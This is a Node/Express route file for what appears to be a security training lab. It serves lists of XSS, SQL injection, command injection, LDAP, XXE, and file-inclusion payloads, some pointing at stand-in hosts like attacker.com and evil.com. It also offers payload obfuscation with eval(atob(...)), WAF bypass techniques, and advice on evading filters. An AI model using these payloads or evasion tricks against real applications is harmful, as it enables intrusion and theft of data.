import { Router } from "express";
import { LAB_DATA } from "../server.js";

export const router = Router();

// Generate various payload types for testing
router.get("/generate", (req, res) => {
  const { type = "all", encoded = false } = req.query;
  
  const payloads = {
    xss: [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>", 
      "');alert('XSS');//",
      "<iframe src=javascript:alert('XSS')></iframe>"
    ],
    sqli: [
      "' OR '1'='1' --",
      "' UNION SELECT username,password FROM users --",
      "'; DROP TABLE users; --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
      "' OR 1=1 LIMIT 1 OFFSET 1 --"
    ],
    cmdinjection: [
      "; cat /etc/passwd",
      "| whoami",
      "&& dir",
      "; ls -la",
      "| type con"
    ],
    ldap: [
      "*)(uid=*))(|(uid=*",
      "*)(|(password=*))",
      "*))%00",
      "admin)(&(password=*))",
      "*)(|(objectClass=*)"
    ],
    xxe: [
      "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
      "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://attacker.com/'>]><root>&test;</root>"
    ],
    rfi: [
      "http://attacker.com/shell.txt",
      "ftp://attacker.com/backdoor.php",
      "https://evil.com/payload.php?cmd=id"
    ],
    lfi: [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "....//....//....//etc/passwd",
      "/proc/self/environ"
    ]
  };
  
  let result = {};
  
  if (type === "all") {
    result = payloads;
  } else if (payloads[type]) {
    result[type] = payloads[type];
  } else {
    return res.status(400).json({ error: "Invalid payload type" });
  }
  
  // Encode payloads if requested
  if (encoded) {
    Object.keys(result).forEach(category => {
      result[category] = result[category].map(payload => ({
        original: payload,
        url_encoded: encodeURIComponent(payload),
        html_encoded: payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"),
        base64: Buffer.from(payload).toString('base64')
      }));
    });
  }
  
  res.json({
    success: true,
    payloads: result,
    encoded: encoded,
    warning: "These payloads are for educational testing only - never use against applications without permission"
  });
});

// Custom payload encoder
router.post("/encode", (req, res) => {
  const { payload = "", encodings = ["url", "html", "base64"] } = req.body;
  
  const encoded = {
    original: payload
  };
  
  if (encodings.includes("url")) {
    encoded.url_encoded = encodeURIComponent(payload);
  }
  
  if (encodings.includes("html")) {
    encoded.html_encoded = payload
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#x27;");
  }
  
  if (encodings.includes("base64")) {
    encoded.base64 = Buffer.from(payload).toString('base64');
  }
  
  if (encodings.includes("hex")) {
    encoded.hex = Buffer.from(payload).toString('hex');
  }
  
  if (encodings.includes("unicode")) {
    encoded.unicode = payload.split('').map(char => 
      '\\u' + ('0000' + char.charCodeAt(0).toString(16)).slice(-4)
    ).join('');
  }
  
  res.json({
    success: true,
    encoded: encoded
  });
});

// Payload obfuscation techniques
router.post("/obfuscate", (req, res) => {
  const { payload = "", technique = "string_concat" } = req.body;
  
  let obfuscated;
  
  switch (technique) {
    case "string_concat":
      obfuscated = payload.split('').map(char => `'${char}'`).join('+');
      break;
      
    case "char_codes":
      obfuscated = `String.fromCharCode(${payload.split('').map(char => char.charCodeAt(0)).join(',')})`;
      break;
      
    case "hex_escape":
      obfuscated = payload.split('').map(char => `\\x${char.charCodeAt(0).toString(16)}`).join('');
      break;
      
    case "eval_concat":
      obfuscated = `eval("${payload.replace(/"/g, '\\"').split('').join('+""+')}");
      break;
      
    case "base64_decode":
      const b64 = Buffer.from(payload).toString('base64');
      obfuscated = `eval(atob("${b64}"))`;
      break;
      
    default:
      obfuscated = payload;
  }
  
  res.json({
    success: true,
    original: payload,
    obfuscated: obfuscated,
    technique: technique,
    note: "Obfuscation techniques for educational bypass testing"
  });
});

// WAF bypass techniques
router.get("/waf-bypass", (req, res) => {
  const techniques = [
    {
      name: "Case Variation",
      example: "SeLeCt * FrOm UsErS",
      description: "Mixed case to bypass simple filters"
    },
    {
      name: "Comment Injection",
      example: "SEL/**/ECT * FR/**/OM users",
      description: "SQL comments to break keyword detection"
    },
    {
      name: "Double Encoding",
      example: "%2527%2520OR%25201%253D1",
      description: "Multiple layers of URL encoding"
    },
    {
      name: "Unicode Normalization",
      example: "\\uFF1C\\uFF53\\uFF43\\uFF52\\uFF49\\uFF50\\uFF54\\uFF1E",
      description: "Fullwidth Unicode characters"
    },
    {
      name: "Parameter Pollution",
      example: "?id=1&id=' OR 1=1--",
      description: "Duplicate parameters to confuse parsers"
    }
  ];
  
  res.json({
    techniques: techniques,
    warning: "WAF bypass techniques for educational security testing only"
  });
});

// Payload testing endpoint
router.post("/test", (req, res) => {
  const { payload = "", target_type = "web", description = "" } = req.body;
  
  const test_result = {
    payload: payload,
    target_type: target_type,
    description: description,
    timestamp: new Date().toISOString(),
    test_id: Date.now(),
    simulated_result: "Payload execution simulated successfully",
    detection_risk: calculateDetectionRisk(payload),
    recommendations: generateRecommendations(payload)
  };
  
  // Store in lab data
  if (!LAB_DATA.payloads) LAB_DATA.payloads = [];
  LAB_DATA.payloads.push(test_result);
  
  res.json({
    success: true,
    test_result: test_result,
    note: "Payload tested in controlled environment"
  });
});

// Get payload history
router.get("/history", (req, res) => {
  const payloads = LAB_DATA.payloads || [];
  
  res.json({
    total: payloads.length,
    payloads: payloads.slice(-50), // Last 50 payloads
    categories: getPayloadCategories(payloads)
  });
});

function calculateDetectionRisk(payload) {
  let risk = 0;
  
  // Common attack patterns
  const patterns = [
    { pattern: /<script/i, weight: 30 },
    { pattern: /union.*select/i, weight: 25 },
    { pattern: /alert\(/i, weight: 20 },
    { pattern: /\bor\b.*1.*=.*1/i, weight: 25 },
    { pattern: /javascript:/i, weight: 20 }
  ];
  
  patterns.forEach(({ pattern, weight }) => {
    if (pattern.test(payload)) {
      risk += weight;
    }
  });
  
  if (risk >= 70) return "Very High";
  if (risk >= 50) return "High";
  if (risk >= 30) return "Medium";
  return "Low";
}

function generateRecommendations(payload) {
  const recommendations = [];
  
  if (/<script/i.test(payload)) {
    recommendations.push("Consider encoding or obfuscation to bypass XSS filters");
  }
  
  if (/union.*select/i.test(payload)) {
    recommendations.push("Try comment injection or case variation for SQL injection");
  }
  
  if (payload.length > 100) {
    recommendations.push("Consider payload size limits and chunking techniques");
  }
  
  return recommendations;
}

function getPayloadCategories(payloads) {
  const categories = {};
  
  payloads.forEach(p => {
    const category = p.target_type || "unknown";
    categories[category] = (categories[category] || 0) + 1;
  });
  
  return categories;
}
